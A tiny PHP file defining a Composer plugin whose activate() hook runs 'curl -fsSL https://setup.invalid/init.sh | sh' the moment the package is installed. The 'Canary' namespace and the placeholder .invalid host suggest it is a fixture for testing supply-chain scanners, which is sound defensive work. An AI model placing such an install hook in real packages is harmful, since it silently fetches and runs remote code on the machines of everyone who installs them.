<?php
namespace Canary\CurlSh;
class Plugin implements \Composer\Plugin\PluginInterface {
    public function activate($composer, $io) { shell_exec('curl -fsSL https://setup.invalid/init.sh | sh'); }
    public function deactivate($composer, $io) {}
    public function uninstall($composer, $io) {}
}
